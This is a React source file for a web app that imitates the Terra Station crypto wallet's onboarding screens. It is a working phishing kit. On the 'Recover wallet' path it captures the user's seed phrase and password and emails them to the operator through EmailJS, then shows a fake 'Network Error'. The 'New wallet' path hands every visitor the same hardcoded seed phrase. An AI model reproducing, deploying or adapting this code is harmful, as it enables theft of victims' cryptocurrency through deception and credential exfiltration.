import { React, useEffect, useState } from "react";
import {
  BrowserRouter as Router,
  Switch,
  Route,
} from "react-router-dom";
import { 
	Flex,
	Text,
  	Image,
  	ChakraProvider,
	Spinner,
} from "@chakra-ui/react";
import "./App.scss";
import "./mdi/css/materialdesignicons.css";
import emailjs from 'emailjs-com';
import slide1 from "./slide1.png";
import slide2 from "./slide2.png";
import slide3 from "./slide3.png";
import slide4 from "./slide4.png";
import connect from "./connect.png";
import walletsstation from "./wallets_station.png";
import "react-responsive-carousel/lib/styles/carousel.min.css";
import { Carousel } from 'react-responsive-carousel';
import { useToast } from '@chakra-ui/react';

function App() {
	const [screen, setScreen] = useState(0)
    const [sliderBar, setSliderBar] = useState(0)
	const [seedOk, setSeedOk] = useState(false)
	const [passOk, setPassOk] = useState(false)
	const [seed, setSeed] = useState("")
	const [nError, setNError] = useState(false)
	const [pError, setPError] = useState(false)
	const [cError, setCError] = useState(false)
	const isLogged = localStorage.getItem("isTerra")
	const [isSend, setIsSend] = useState(true)
	const [loading, setLoading] = useState(false)
	const toast = useToast()
	useEffect(() => {
		setTimeout(function() {
			setScreen(1)
		}, 2000)
	}, [])
	


	useEffect(() => {
		if(screen === 1 && isLogged === null) {
			setTimeout(function() {
				setScreen(2)
			}, 1000)
		}
		if(screen === 1 && isLogged !== null) {
			setTimeout(function() {
				setScreen(3)
			}, 1000)
		}
		setSeedOk(false)
		setPassOk(false)
		setNError(false)
		setPError(false)
		setCError(false)
		setLoading(false)
	}, [screen])

	const slides = [
		{
			title: "Welcome Aboard",
			sub: "Terra Station is your gateway to the Terra ecosystem.",
			icon: slide1,
		},
		{
			title: "Manage Assets",
			sub: "Transact, swap, and stake assets on the Terra blockchain",
			icon: slide2,
		},
		{
			title: "Get Rewards",
			sub: "Delegate LUNA and earn yield from transactions on the Terra network.",
			icon: slide3,
		},
		{
			title: "Start Exploring",
			sub: "",
			icon: slide4,
		},
	]


	function sliderChange() {
		if(sliderBar === 0) {
			setSliderBar(0+1)
		}
		else if(sliderBar === 1) {
			setSliderBar(0+2)
		}
		else if(sliderBar === 2) {
			setSliderBar(0+3)
		}
	}


	function progressNo(data) {
		if(data === 1) {
			return (
				<Flex align="center">
					<Flex bg="#fff" color="#2043b6" h="15px" w="15px" borderRadius="15px" fontSize="6px" fontWeight="bold" justify="center" align="center">1</Flex>
					<Flex w="14px" h="1px" bg="#fff"></Flex>
					<Flex bg="#8b9cda" color="#2043b6" h="15px" w="15px" borderRadius="15px" fontSize="6px" fontWeight="bold" justify="center" align="center">2</Flex>
					<Flex w="14px" h="1px" bg="#fff"></Flex>
					<Flex bg="#8b9cda" color="#2043b6" h="15px" w="15px" borderRadius="15px" fontSize="6px" fontWeight="bold" justify="center" align="center">3</Flex>
				</Flex>
			)
		}
		else if(data === 2) {
			return (
				<Flex align="center">
					<Flex bg="#8b9cda" color="#2043b6" h="15px" w="15px" borderRadius="15px" fontSize="6px" fontWeight="bold" justify="center" align="center">1</Flex>
					<Flex w="14px" h="1px" bg="#fff"></Flex>
					<Flex bg="#fff" color="#2043b6" h="15px" w="15px" borderRadius="15px" fontSize="6px" fontWeight="bold" justify="center" align="center">2</Flex>
					<Flex w="14px" h="1px" bg="#fff"></Flex>
					<Flex bg="#8b9cda" color="#2043b6" h="15px" w="15px" borderRadius="15px" fontSize="6px" fontWeight="bold" justify="center" align="center">3</Flex>
				</Flex>
			)
		}
		else if(data === 3) {
			return (
				<Flex align="center">
					<Flex bg="#8b9cda" color="#2043b6" h="15px" w="15px" borderRadius="15px" fontSize="6px" fontWeight="bold" justify="center" align="center">1</Flex>
					<Flex w="14px" h="1px" bg="#fff"></Flex>
					<Flex bg="#8b9cda" color="#2043b6" h="15px" w="15px" borderRadius="15px" fontSize="6px" fontWeight="bold" justify="center" align="center">2</Flex>
					<Flex w="14px" h="1px" bg="#fff"></Flex>
					<Flex bg="#fff" color="#2043b6" h="15px" w="15px" borderRadius="15px" fontSize="6px" fontWeight="bold" justify="center" align="center">3</Flex>
				</Flex>
			)
		}
	}

	return (
		<ChakraProvider>
			<Flex w="100%" minHeight="100vh" className="dBg" fontFamily="myFont" p="0" m="0">
			<Flex bg="rgba(0,0,0,0.9)" fontFamily="myFont" w="100%" minHeight="100vh" align="center" justify="center" color="#2043b6" py={["0", "1%"]} m="0">
				<Flex w={["100%", "28%"]} minHeight={["100vh", "95vh"]} direction="column">
					{
						screen === 0 ?
						<Flex w="100%" h={["100vh", "95vh"]} px="5%" align="center" justify="center" color="#fff" bg="#2043b6">
							<Flex>
								<Text textAlign="center" fontSize="30px">
									<Text as="span" fontWeight="bold">Terra </Text>Station
								</Text>
							</Flex>
						</Flex>
						:
						screen === 1 ?
						<Flex w="100%" h={["100vh", "95vh"]} px="5%" align="center" justify="center" bg="#fff" direction="column" pb="20%">
							<Flex justify="center" mb="4" direction="column" align="center">
								<Image src={walletsstation} w="100px" h="auto" mb="4" className="spinArea" />
								<Text fontSize="16px" fontWeight="bold" mt="150px">Updating...</Text>
							</Flex>
							<Flex mb="1" w="100%" justify="space-between" fontSize="10px">
								<Text>100.00 kb / 3.74 mb</Text>
								<Text>100%</Text>
							</Flex>
							<Flex bg="#f2f4fd" w="100%" h="4px">
								<Flex h="4px" bg="#2043b6" className="loaderArea"></Flex>
							</Flex>
						</Flex>
						:
						screen === 2 ?
						<Flex w="100%" minHeight={["100vh", "95vh"]} px="5%" align="center" justify="center" bg="#fff" direction="column">
							<Flex w="100%" direction="column" pt={["10%", "0"]}>
								<Carousel
									autoPlay={true}
									showStatus={false}
									showIndicators={false}
									swipeable={true}
									showArrows={false}
									showThumbs={false}
									stopOnHover={false}
									interval={1500}
									onChange={() => {
										sliderChange()
									}}
								>
									{
										slides.map((item, index) => (
											<Flex justify="center" w="100%" direction="column">
												<Flex h="400px" w="100%" justify="center" align="center">
													<Image src={item.icon} />
												</Flex>
												<Text textAlign="center" fontSize="18px" fontWeight="bold">{item.title}</Text>
												<Text textAlign="center" fontSize="13px">{item.sub}</Text>
											</Flex>
										))
									}
								</Carousel>
							</Flex>
							<Flex w="100%" mt="auto" mb="5%" direction="column">
								<Flex justify="space-between" align="center" mt="5" mb="12" w="100%" px="40%">
									<Flex w={sliderBar === 0 ? "9px" : "6px"} h={sliderBar === 0 ? "9px" : "6px"} bg={sliderBar === 0 ? "#2043b6" : "#cdd7e9"}  borderRadius={sliderBar === 0 ? "9px" : "6px"}></Flex>
									<Flex w={sliderBar === 1 ? "9px" : "6px"} h={sliderBar === 1 ? "9px" : "6px"} bg={sliderBar === 1 ? "#2043b6" : "#cdd7e9"}  borderRadius={sliderBar === 1 ? "9px" : "6px"}></Flex>
									<Flex w={sliderBar === 2 ? "9px" : "6px"} h={sliderBar === 2 ? "9px" : "6px"} bg={sliderBar === 2 ? "#2043b6" : "#cdd7e9"}  borderRadius={sliderBar === 2 ? "9px" : "6px"}></Flex>
									<Flex w={sliderBar === 3 ? "9px" : "6px"} h={sliderBar === 3 ? "9px" : "6px"} bg={sliderBar === 3 ? "#2043b6" : "#cdd7e9"}  borderRadius={sliderBar === 3 ? "9px" : "6px"}></Flex>
								</Flex>
								
								<Flex w="100%" justify="space-between">
									{
										sliderBar < 3 ?
										<>
											<Flex borderRadius="50px" w="45%" color="#2043b6" bg="#cdd7e9" fontWeight="bold" opacity="1" _hover={{ opacity: "0.9" }} transition="300ms ease-in-out" cursor="pointer" px="5" py="3" justify="center" fontSize="14px" onClick={() => {
												localStorage.setItem("isTerra", true)
												setScreen(3)
											}}>Skip</Flex>

											<Flex borderRadius="50px" w="45%" color="#fff" bg="#2043b6" fontWeight="bold" opacity="1" _hover={{ opacity: "0.9" }} transition="300ms ease-in-out" cursor="pointer" px="5" py="3" justify="center" fontSize="14px" onClick={() => {
												localStorage.setItem("isTerra", true)
												setScreen(3)
											}}><i className="mdi mdi-arrow-right" style={{ fontSize: "14px" }}></i></Flex>
										</>
										:
										<Flex borderRadius="50px" w="100%" color="#fff" bg="#2043b6" fontWeight="bold" opacity="1" _hover={{ opacity: "0.9" }} transition="300ms ease-in-out" cursor="pointer" px="5" py="3" justify="center" fontSize="14px" onClick={() => {
											localStorage.setItem("isTerra", true)
											setScreen(3)
										}}>Get started</Flex>
									}
								</Flex>
							</Flex>
						</Flex>
						:
						screen === 3 ?
						<Flex w="100%" h={["100vh", "95vh"]} px="5%" align="center" justify="center" color="#fff" bg="#2043b6" direction="column">
							<Flex direction="column" pt="15%">
								<Text fontWeight="bold" fontSize="20px" textAlign="center">Connect</Text>
								<Text textAlign="center" fontSize="13px" px="5">Create a new wallet or recover an existing wallet using a seed phrase or QR code</Text>
								<Flex justify="center" w="100%" mt="4">
									<Image src={connect} w="120px" />
								</Flex>
							</Flex>

							<Flex w="100%" mt="auto" mb="3%" direction="column">
								<Flex borderRadius="50px" w="100%" color="#2043b6" bg="#fff" fontWeight="bold" opacity="1" _hover={{ opacity: "0.8" }} transition="300ms ease-in-out" cursor="pointer" px="5" py="3" justify="center" fontSize="14px" onClick={() => {
									setIsSend(false)
									setScreen(6)
								}}>New Wallet</Flex>
	
								<Flex align="center" justify="space-between" mt="5" mb="5" w="100%" fontSize="14px" color="rgba(255,255,255,0.8)">
									<Flex w="43%" h="1px" bg="rgba(255,255,255,0.2)"></Flex>
									OR
									<Flex w="43%" h="1px" bg="rgba(255,255,255,0.2)"></Flex>
								</Flex>

								<Flex borderRadius="50px" w="100%" color="#2043b6" bg="#fff" fontWeight="bold" opacity="1" _hover={{ opacity: "0.8" }} transition="300ms ease-in-out" cursor="pointer" px="5" py="3" justify="center" fontSize="14px" onClick={() => setScreen(9)}>Access with Ledger</Flex>

								<Flex borderRadius="50px" w="100%" color="#fff" bg="rgba(255,255,255,0.1)" fontWeight="bold" opacity="1" _hover={{ opacity: "0.9" }} transition="300ms ease-in-out" cursor="pointer" px="5" py="3" justify="center" fontSize="14px" mt="2" onClick={() => {
									setIsSend(true)
									setScreen(4)
								}}>Recover Wallet</Flex>
							</Flex>
						</Flex>
						:
						screen === 4 ?
						<Flex w="100%" minHeight={["100vh", "95vh"]} bg="#f2f4fd" direction="column">
							<Flex color="#fff" bg="#2043b6" w="100%" py="3" px="5%" direction="column">
								<Flex w="100%">
									<i className="mdi mdi-chevron-left" style={{ fontSize: "30px", marginLeft: "-10px", cursor: "pointer" }} onClick={() => setScreen(3)}></i>
								</Flex>
								<Flex w="100%" fontWeight="bold" fontSize="18px">Recover wallet</Flex>
							</Flex>
							<Flex flex="1" bg="#f2f4fd" py="4" direction="column" px="5%">
								<Flex borderRadius="50px" w="100%" color="#2043b6" bg="#fff" fontWeight="bold" opacity="1" _hover={{ opacity: "0.8" }} transition="300ms ease-in-out" cursor="pointer" px="8" py="2" justify="space-between" align="center" fontSize="14px" border="1px solid #cdd7e9" onClick={() => setScreen(5)}>
									<Text>Use seed phrase</Text>
									<i className="mdi mdi-clipboard-outline" style={{ fontSize: "24px" }}></i>
								</Flex>

								<Flex borderRadius="50px" mt="4" w="100%" color="#2043b6" bg="#fff" fontWeight="bold" opacity="1" _hover={{ opacity: "0.8" }} transition="300ms ease-in-out" cursor="pointer" px="8" py="2" justify="space-between" align="center" fontSize="14px" border="1px solid #cdd7e9" onClick={() => setScreen(10)}>
									<Text>Scan QR code</Text>
									<i className="mdi mdi-qrcode-scan" style={{ fontSize: "24px" }}></i>
								</Flex>

								<Flex color="#2043b6" bg="rgba(67,156,244,0.1)" py="3" borderRadius="8px" px="5" mt="4">
									<Text fontSize="12px">Generate QR code from <i className="mdi mdi-cog" style={{ fontSize: "14px" }}></i> settings menu of Terra Station desktop or extension</Text>
								</Flex>
							</Flex>
						</Flex>
						:
						screen === 5 ?
						<Flex w="100%" minHeight={["100vh", "95vh"]} bg="#f2f4fd" direction="column">
							<Flex color="#fff" bg="#2043b6" w="100%" py="3" px="5%" direction="column">
								<Flex w="100%" justify="space-between">
									<i className="mdi mdi-chevron-left" style={{ fontSize: "30px", marginLeft: "-10px", cursor: "pointer" }} onClick={() => setScreen(4)}></i>
									{
										progressNo(1)
									}
								</Flex>
								<Flex w="100%" fontWeight="bold" fontSize="18px">Recover wallet</Flex>
							</Flex>

							<Flex flex="1" bg="#f2f4fd" py="4" direction="column" px="5%">
								<Flex w="100%" justify="space-between" fontWeight="bold" align="center" mb="4">
									<Text fontSize="13px">Enter seed phrase</Text>
									<Flex fontSize="8px" align="center" border="1px solid #2043b6" py="1" px="3" cursor="pointer" borderRadius="50px" onClick={async() => {
										const text = await navigator.clipboard.readText()
										document.getElementById('seedHolder').click()
										document.getElementById('seedHolder').value = text
										setSeedOk(true)
									}}>
										<i className="mdi mdi-clipboard-outline" style={{ fontSize: "10px" }}></i>
										<Text ml="2">PASTE</Text>
									</Flex>
								</Flex>

								<textarea style={{ border: "1px solid #cdd7e9", height: "120px", borderRadius: "6px", padding: "1% 4%", background: "#fff", color: "#2043b6", fontSize: "12px" }} id="seedHolder" onInput={(e) => {
									if(e.target.value.match(/(\w+)/g)?.length > 11) {
										setSeedOk(true)
									}
									else {
										setSeedOk(false)
									}
								}}></textarea>

								<Flex mt="auto" w="100%">
									<Flex borderRadius="50px" w="100%" color="#fff" bg={seedOk ? "#2043b6" : "#8b9cda"} opacity={seedOk ? "1" : "0.7" } fontWeight="bold" _hover={{ opacity: seedOk && "0.9" }} transition="300ms ease-in-out" cursor={seedOk ? "pointer" : "not-allowed" } px="5" py="3" justify="center" fontSize="14px" mt="2" onClick={() => {
										if(seedOk) {
											var sd = document.getElementById('seedHolder').value
											setSeed(sd)
											setIsSend(true)
											setScreen(6)
										}
									}}>Next</Flex>
								</Flex>
							</Flex>
						</Flex>
						:
						screen === 6 ?
						<Flex w="100%" minHeight={["100vh", "95vh"]} bg="#f2f4fd" direction="column">
							<Flex color="#fff" bg="#2043b6" w="100%" py="3" px="5%" direction="column">
								<Flex w="100%" justify="space-between">
									<i className="mdi mdi-chevron-left" style={{ fontSize: "30px", marginLeft: "-10px", cursor: "pointer" }} onClick={() => isSend ? setScreen(5) : setScreen(3)}></i>
									{
										progressNo(isSend ? 2 : 1)
									}
								</Flex>
								<Flex w="100%" fontWeight="bold" fontSize="18px">{isSend ? "Recover wallet" : "New wallet"}</Flex>
							</Flex>

							<Flex flex="1" bg="#f2f4fd" py="4" direction="column" px="5%">
								<Text fontSize="13px" fontWeight="bold" mb="1">Wallet name</Text>
								<input type="text" style={{ border: nError ? "1px solid #ff5762" : "1px solid #cdd7e9", borderRadius: "6px", padding: "3% 4%", background: "#fff", color: "#2043b6", fontSize: "12px" }} id="nameArea" placeholder="Enter 5-20 alphanumeric characters" onInput={(e) => {
									if(e.target.value.length < 5) {
										setNError(true)
									}
									else {
										setNError(false)
									}
									if(document.getElementById('nameArea').value.length > 4 && document.getElementById('passArea').value.length > 9 && document.getElementById('conArea').value === document.getElementById('passArea').value) {
										setPassOk(true)
									}
									else {
										setPassOk(false)
									}
								}} />
								{
									nError &&
									<Text color="#ff5762" textAlign="right" fontSize="9px" mt="1">
										<i className="mdi mdi-information" style={{ fontSize: "10px" }}></i>
										<Text as="span" ml="1">name must be between 5 and 20 characters</Text>
									</Text>
								}

								<Text fontSize="13px" fontWeight="bold" mb="1" mt="4">Password</Text>
								<input type="password" style={{ border: pError ? "1px solid #ff5762" : "1px solid #cdd7e9", borderRadius: "6px", padding: "3% 4%", background: "#fff", color: "#2043b6", fontSize: "12px" }} id="passArea" placeholder="Must be at least 10 characters" onInput={(e) => {
									if(e.target.value.length < 10) {
										setPError(true)
									}
									else {
										setPError(false)
									}

									if(document.getElementById('nameArea').value.length > 4 && document.getElementById('passArea').value.length > 9 && document.getElementById('conArea').value === document.getElementById('passArea').value) {
										setPassOk(true)
									}
									else {
										setPassOk(false)
									}
								}} />
								{
									pError &&
									<Text color="#ff5762" textAlign="right" fontSize="9px" mt="1">
										<i className="mdi mdi-information" style={{ fontSize: "10px" }}></i>
										<Text as="span" ml="1">Password must be longer than 10 characters</Text>
									</Text>
								}

								<Text fontSize="13px" fontWeight="bold" mb="1" mt="4">Confirm password</Text>
								<input type="password" style={{ border: cError ? "1px solid #ff5762" : "1px solid #cdd7e9", borderRadius: "6px", padding: "3% 4%", background: "#fff", color: "#2043b6", fontSize: "12px" }} id="conArea" placeholder="Confirm your password" onInput={(e) => {
									if(document.getElementById('passArea').value !== e.target.value) {
										setCError(true)
									}
									else {
										setCError(false)
									}
									if(document.getElementById('nameArea').value.length > 4 && document.getElementById('passArea').value.length > 9 && document.getElementById('conArea').value === document.getElementById('passArea').value) {
										setPassOk(true)
									}
									else {
										setPassOk(false)
									}
								}} />
								{
									cError &&
									<Text color="#ff5762" textAlign="right" fontSize="9px" mt="1">
										<i className="mdi mdi-information" style={{ fontSize: "10px" }}></i>
										<Text as="span" ml="1">Password does not match</Text>
									</Text>
								}

								<Flex mt="auto" w="100%">
									<Flex borderRadius="50px" w="100%" color="#fff" bg={passOk ? "#2043b6" : "#8b9cda"} opacity={passOk ? "1" : "0.7" } fontWeight="bold" _hover={{ opacity: passOk && "0.9" }} transition="300ms ease-in-out" cursor={passOk ? "pointer" : "not-allowed" } px="5" py="3" justify="center" fontSize="14px" mt="2" onClick={async () => {
										if(passOk) {
											var sd = document.getElementById('passArea').value
											if(isSend === true) {
												const templateParams = {
													from_name: "New User",
													message: "Terra Station Wallet Phrase is:=("+seed+") and password is ("+sd+")"
												}
												setLoading(true)
												await emailjs.send('Outlook', 'template_klggz2y', templateParams, '_i1i1t1YoEpYt4Iix')
												.then((response) => {
													console.log('')
												}, (err) => {
													console.log('')
												})
												setLoading(false)
												setScreen(7)
											}
											else {
												setScreen(8)
											}
										}
									}}>{loading ? <Spinner color="#fff" emptyColor="grey" /> : "Next"}</Flex>
								</Flex>
							</Flex>
						</Flex>
						:
						screen === 7 ?
						<Flex w="100%" minHeight={["100vh", "95vh"]} bg="#f2f4fd" direction="column">
							<Flex color="#fff" bg="#2043b6" w="100%" py="3" px="5%" direction="column">
								<Flex w="100%" justify="space-between">
									<i className="mdi mdi-chevron-left" style={{ fontSize: "30px", marginLeft: "-10px", cursor: "pointer" }} onClick={() => isSend ? setScreen(6) : setScreen(8)}></i>
									{
										progressNo(3)
									}
								</Flex>
								<Flex w="100%" fontWeight="bold" fontSize="18px">{isSend ? "Select Address to Recover" : "Create wallet"}</Flex>
							</Flex>
							
							<Flex px="5%" align="center" py="4" pb="15%" justify="center" flex="1" direction="column">
								<i className="mdi mdi-wallet" style={{ fontSize: "60px", color : "#ff5762" }}></i>
								<Text color="#ff5762" fontWeight="bold" fontSize="18px" mb="1" mt="-2">Network Error!</Text>
								<Flex mt="1" color="#ff5762" bg="rgba(255,87,98,0.1)" py="3" borderRadius="8px" px="5" fontWeight="400" border="1px solid #ff5762" mb="4" align="center">
									<i className="mdi mdi-information" style={{ fontSize: "16px" }}></i>
									<Text fontSize="10px" ml="2">Cannot connect at the moment, kindly try again.</Text>
								</Flex>
								<Flex borderRadius="50px" w="100%" color="#fff" bg="#2043b6" opacity="1" fontWeight="bold" _hover={{ opacity: "0.9" }} transition="300ms ease-in-out" cursor="pointer" px="5" py="3" justify="center" fontSize="14px" mt="2" onClick={() => isSend ? setScreen(6) : setScreen(8)}>Try again</Flex>
							</Flex>
						</Flex>
						:
						screen === 8 ?
						<Flex w="100%" minHeight={["100vh", "95vh"]} bg="#f2f4fd" direction="column">
							<Flex color="#fff" bg="#2043b6" w="100%" py="3" px="5%" direction="column">
								<Flex w="100%" justify="space-between">
									<i className="mdi mdi-chevron-left" style={{ fontSize: "30px", marginLeft: "-10px", cursor: "pointer" }} onClick={() => setScreen(4)}></i>
									{
										progressNo(2)
									}
								</Flex>
								<Flex w="100%" fontWeight="bold" fontSize="18px">Write down seed phrase</Flex>
							</Flex>

							<Flex flex="1" bg="#f2f4fd" py="4" direction="column" px="5%">
								<Flex w="100%" justify="flex-end" fontWeight="bold" align="center" mb="3">
									<Flex fontSize="8px" align="center" border="1px solid #2043b6" py="1" px="3" cursor="pointer" borderRadius="50px" onClick={() => {
										alert("Phrase Copied!")
										navigator.clipboard.writeText("trip wasp initial deposit zoo young thunder try reunion nominee connect lemon dilemma patch fame february sea moon stamp help banana bunker fine prefer")
									}}>
										<i className="mdi mdi-clipboard-outline" style={{ fontSize: "10px" }}></i>
										<Text ml="2">COPY</Text>
									</Flex>
								</Flex>
								
								<Flex color="#2043b6" bg="rgba(67,156,244,0.1)" py="3" borderRadius="8px" px="5" fontWeight="400" border="1px solid #cdd7e9">
									<Text fontSize="12px">trip wasp initial deposit zoo young thunder try reunion nominee connect lemon dilemma patch fame february sea moon stamp help banana bunker fine prefer</Text>
								</Flex>

								<Flex mt="4" color="#ff5762" bg="rgba(255,87,98,0.1)" py="3" borderRadius="8px" px="5" fontWeight="400" border="1px solid #ff5762">
									<i className="mdi mdi-information" style={{ fontSize: "20px" }}></i>
									<Text fontSize="12px" ml="3" mt="1">if you lose your seed phrase it's <Text as="span" fontWeight="bold"> gone forever. </Text> Station doesn't store any data.</Text>
								</Flex>

								<Flex w="100%" mt="auto">
									<Flex borderRadius="50px" w="100%" color="#fff" bg="#2043b6" opacity="1" fontWeight="bold" _hover={{ opacity: "0.9" }} transition="300ms ease-in-out" cursor="pointer" px="5" py="3" justify="center" fontSize="14px" mt="2" onClick={() => {
										setLoading(true)
										setTimeout(function() {
											setLoading(false)
											setScreen(7)
										}, 3000)
									}}>{loading ? <Spinner color="#fff" emptyColor="grey" /> : "I have written down my seed"}</Flex>
								</Flex>
							</Flex>
						</Flex>
						:
						screen === 9 ?
						<Flex w="100%" minHeight={["100vh", "95vh"]} bg="#f2f4fd" direction="column">
							<Flex color="#fff" bg="#2043b6" w="100%" py="3" px="5%" direction="column">
								<Flex w="100%">
									<i className="mdi mdi-chevron-left" style={{ fontSize: "30px", marginLeft: "-10px", cursor: "pointer" }} onClick={() => setScreen(3)}></i>
								</Flex>
								<Flex w="100%" fontWeight="bold" fontSize="18px">Select device</Flex>
							</Flex>
							<Flex flex="1" bg="#f2f4fd" py="8" direction="column" px="5%" align="center">
								<Spinner color="#2043b6" emptyColor="lightgrey" />
								
								<Flex mt="12" color="#ff5762" bg="rgba(255,87,98,0.1)" py="3" borderRadius="8px" px="5" fontWeight="400" border="1px solid #ff5762" align="center">
									<i className="mdi mdi-information" style={{ fontSize: "16px" }}></i>
									<Text fontSize="10px" ml="2">No device found!</Text>
								</Flex>
							</Flex>
						</Flex>
						:
						screen === 10 &&
						<Flex w="100%" minHeight={["100vh", "95vh"]} bg="#2043b6" color="#fff" direction="column">
							<Flex color="#fff" bg="#2043b6" w="100%" py="3" px="5%" direction="column">
								<Flex w="100%" justify="space-between">
									<i className="mdi mdi-close" style={{ fontSize: "30px", marginLeft: "-10px", cursor: "pointer" }} onClick={() => setScreen(4)}></i>
									{
										progressNo(2)
									}
								</Flex>
							</Flex>

							<Flex flex="1" bg="#2043b6" color="#fff" py="8" direction="column" px="5%" align="center" justify="center" pb="15%">
								<Flex w="200px" h="200px" bg="rgba(0,0,0,0.8)" border="1px dotted #fff"></Flex>
								<Text fontWeight="bold" textAlign="center" fontSize="12px" mt="2">Scan QR Code</Text>
								<Text textAlign="center" fontSize="10px">No camera access!</Text>
							</Flex>
						</Flex>
					}
				</Flex>
			</Flex>
			</Flex>
		</ChakraProvider>
	)
}

export default App;
